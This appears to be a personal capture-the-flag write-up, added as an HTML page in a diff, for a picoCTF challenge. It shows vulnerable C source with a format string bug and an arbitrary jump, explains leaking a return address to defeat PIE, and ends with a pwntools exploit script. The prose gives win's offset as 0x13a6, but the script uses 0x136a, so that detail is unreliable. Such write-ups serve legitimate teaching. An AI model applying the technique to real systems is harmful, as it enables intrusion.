@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>You can download the binary <a href="https://challenge-files.picoctf.net/c_rescued_float/f4dce87292c868566835322121dd24ce19106005a91ad728e9554544e2699e22/vuln">here</a>.</p>
+        <p>The source code is as follows.</p>
+        <pre><code>
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void segfault_handler() {
+  printf("Segfault Occurred, incorrect address.\n");
+  exit(0);
+}
+
+void call_functions() {
+  char buffer[64];
+  printf("Enter your name:");
+  fgets(buffer, 64, stdin);
+  printf(buffer);
+
+  unsigned long val;
+  printf(" enter the address to jump to, ex => 0x12345: ");
+  scanf("%lx", &val);
+
+  void (*foo)(void) = (void (*)())val;
+  foo();
+}
+
+int win() {
+  FILE *fptr;
+  char c;
+
+  printf("You won!\n");
+  // Open file
+  fptr = fopen("flag.txt", "r");
+  if (fptr == NULL)
+  {
+      printf("Cannot open file.\n");
+      exit(0);
+  }
+
+  // Read contents from file
+  c = fgetc(fptr);
+  while (c != EOF)
+  {
+      printf ("%c", c);
+      c = fgetc(fptr);
+  }
+
+  printf("\n");
+  fclose(fptr);
+}
+
+int main() {
+  signal(SIGSEGV, segfault_handler);
+  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered
+
+  call_functions();
+  return 0;
+}
+    </code></pre> 
+    <p>Examining the source code I could see that the program had a format string bug in <code>call_functions</code>.</p>
+    <p>Doing a checksec I could see that it used PIE, suggesting I needed to get the base address of the PIE image.</p>
+    <img src="checksec.png" width="300px" height="auto">
+    <p>I reconstructed the stack frame of <code>call_functions</code> when <code>printf</code> was called.</p>
+    <img src="stack.png" width="300px" height="auto">
+    <p>
+        From there I deduced that if I input <code>"%19$p"</code> I could make the program leak the return address of <code>call_functions</code> which would be
+        some location in the the <code>.text</code> section, more specifically somewhere in <code>main</code>. Examining the stack using pwndbg, I could see that the return address was always 0x1441 bytes
+        bigger than PIE base.
+    </p>
+    <img src="gdb_stack.png" width="600px" height="auto">
+    <img src="vmmap.png" width="600px" height="auto">
+    <p>Additionally, disassembling <code>win</code> revealed that it was 0x13a6 bytes away from PIE base.</p>
+    <img src="gdb_win.png" width="400px" height="auto">
+    <p>The exploit code is as below.</p>
+    <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    context.log_level = "debug"
+    p = remote("rescued-float.picoctf.net", 64379)
+    p.recvuntil(b":")
+    p.sendline(b"%19$p")
+    ret_addr = int(p.recvline().strip(), 16)
+    img_base = ret_addr - 0x1441
+    win_addr = img_base + 0x136a 
+    print(f"{img_base=:x}")
+    print(f"{win_addr=:x}")
+    p.recvuntil(b": ")
+    p.sendline(b"%x" % win_addr)
+    p.interactive() 
+
+if __name__ == "__main__": ex()
+    </code></pre>
+    </main>
+</body>
+</html>
